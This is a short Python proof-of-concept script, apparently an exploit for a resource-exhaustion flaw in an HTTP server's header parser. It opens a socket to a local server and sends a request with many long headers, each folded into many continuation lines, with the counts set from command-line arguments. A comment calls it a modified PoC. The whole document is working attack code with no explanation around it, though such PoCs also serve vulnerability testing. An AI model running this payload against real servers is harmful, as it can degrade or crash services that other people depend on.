import socket
import sys
import time

HOST = '127.0.0.1'
PORT = 8081

# Construct the HTTP request
request = """GET / HTTP/1.1\r
Host: example.com\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r
Content-Type: text/plain\r"""

# modified a bit to support multiple-keys and carriege return, but the poc is the same
try :
  repeat = int(sys.argv[1])
  repeat_2 = int(sys.argv[2])
except :
  print("Usage {} <how-many-keys> <subkey-amount-foreach-key>".format(sys.argv[0]))
  sys.exit(-1)

key_val = "\r\n".join(
  [ 
    f"Long-Key{j}: v\n" + "\n".join([f" v{i}" for i in range(repeat_2)]) for j in range(repeat) 
  ]
)


# Create a TCP/IP socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # Connect to the server
    s.connect((HOST, PORT))
    
    # Send the request
    request = request + "\n" + key_val + "\r\n\r\n"

    s.sendall(request.encode())

    # Receive the response
    time.sleep(1.5)
    data = s.recv(4096)

print('Received:')
print(data)



